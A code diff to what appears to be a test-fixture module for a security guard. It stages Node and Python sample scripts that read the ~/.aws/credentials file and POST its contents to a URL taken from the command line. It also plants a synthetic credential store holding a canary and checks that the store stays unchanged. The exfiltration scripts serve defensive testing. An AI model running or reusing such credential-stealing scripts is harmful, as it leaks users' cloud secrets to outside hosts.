@@ -11,8 +11,6 @@ from __future__ import annotations
 
 from pathlib import Path
 
-from .fixtures import SOURCE, SOURCE_FILES
-
 NODE_REPORT_CASE = "script-node-project-report"
 PYTHON_REPORT_CASE = "script-python-project-report"
 REPORT_CASES = frozenset({NODE_REPORT_CASE, PYTHON_REPORT_CASE})
@@ -28,7 +26,32 @@ EXFILTRATION_CASES = frozenset(
 )
 STAGED_CASES = REPORT_CASES | EXFILTRATION_CASES
 
-REPORT_OUTPUT = f"report: {len(SOURCE_FILES)} files; first line: {SOURCE.splitlines()[0]}\n"
+EXFILTRATION_REASON = "native_secret_exfiltration"
+# A script file that reads a credential store and uses the network is the content-level
+# verdict; a generic network review of the same script does not prove that boundary.
+CREDENTIAL_STORE_CASES = frozenset(
+    {
+        "script-node-file-credential-post",
+        "script-python-file-credential-post",
+        "script-node-helper-credential-post",
+        "script-python-helper-credential-post",
+    }
+)
+SCRIPT_BLOCK_REASONS: dict[str, frozenset[str]] = {
+    case: frozenset({EXFILTRATION_REASON}) for case in CREDENTIAL_STORE_CASES
+}
+# The synthetic store sits under the fixture HOME, where Guard names it as a cloud credential file.
+CREDENTIAL_STORE = ".aws/credentials"
+STORE_CHECK = "protected:script-credential-store-unchanged"
+
+
+
+def report_output() -> str:
+    """The exact report both scripts print for the shared fixture (deferred: fixtures imports this module)."""
+    from .fixtures import SOURCE, SOURCE_FILES
+
+    return f"report: {len(SOURCE_FILES)} files; first line: {SOURCE.splitlines()[0]}\n"
+
 
 _NODE_REPORT = """import { readdirSync, readFileSync } from 'node:fs';
 
@@ -44,7 +67,7 @@ print(f"report: {len(files)} files; first line: {first}")
 """
 _NODE_SYNC = """import { readFileSync } from 'node:fs';
 
-const body = readFileSync('.env', 'utf8');
+const body = readFileSync(process.env.HOME + '/.aws/credentials', 'utf8');
 await fetch(process.argv[2], { method: 'POST', body });
 console.log('synced');
 """
@@ -52,14 +75,14 @@ _PYTHON_SYNC = """import sys
 import urllib.request
 from pathlib import Path
 
-body = Path(".env").read_bytes()
+body = (Path.home() / ".aws/credentials").read_bytes()
 urllib.request.urlopen(urllib.request.Request(sys.argv[1], data=body, method="POST"))
 print("synced")
 """
 _NODE_HELPER_MAIN = """import { readFileSync } from 'node:fs';
 import { send } from './lib/send.mjs';
 
-await send(process.argv[2], readFileSync('.env', 'utf8'));
+await send(process.argv[2], readFileSync(process.env.HOME + '/.aws/credentials', 'utf8'));
 console.log('synced');
 """
 _NODE_HELPER = """export async function send(url, body) {
@@ -71,7 +94,7 @@ from pathlib import Path
 
 from lib.send import send
 
-send(sys.argv[1], Path(".env").read_bytes())
+send(sys.argv[1], (Path.home() / ".aws/credentials").read_bytes())
 print("synced")
 """
 _PYTHON_HELPER = """import urllib.request
@@ -98,9 +121,30 @@ _FILES = {
 }
 
 
-def stage_script_cases(workspace: Path, scenario_id: str) -> None:
-    """Write one case's scripts; inline cases and every other case keep the shared fixture."""
+def _store_text(canary: str) -> str:
+    return f"[default]\naws_secret_access_key = {canary}\n"
+
+
+def stage_script_cases(workspace: Path, scenario_id: str, home: Path | None = None, canary: str = "") -> None:
+    """Write one case's scripts; inline cases and every other case keep the shared fixture.
+
+    A credential-store case also gets a synthetic store under the fixture HOME holding the run's canary.
+    """
     for relative, contents in _FILES.get(scenario_id, {}).items():
         path = workspace / relative
         path.parent.mkdir(mode=0o700, parents=True, exist_ok=True)
         path.write_text(contents, encoding="utf-8", newline="\n")
+    if scenario_id in CREDENTIAL_STORE_CASES and home is not None:
+        store = home / CREDENTIAL_STORE
+        store.parent.mkdir(mode=0o700, parents=True, exist_ok=True)
+        store.write_text(_store_text(canary), encoding="utf-8", newline="\n")
+
+
+def script_case_checks(home: Path, canary: str, scenario_id: str) -> dict[str, bool]:
+    """The synthetic credential store must still hold its original bytes."""
+    if scenario_id not in CREDENTIAL_STORE_CASES:
+        return {}
+    try:
+        return {STORE_CHECK: (home / CREDENTIAL_STORE).read_text(encoding="utf-8") == _store_text(canary)}
+    except OSError:
+        return {STORE_CHECK: False}
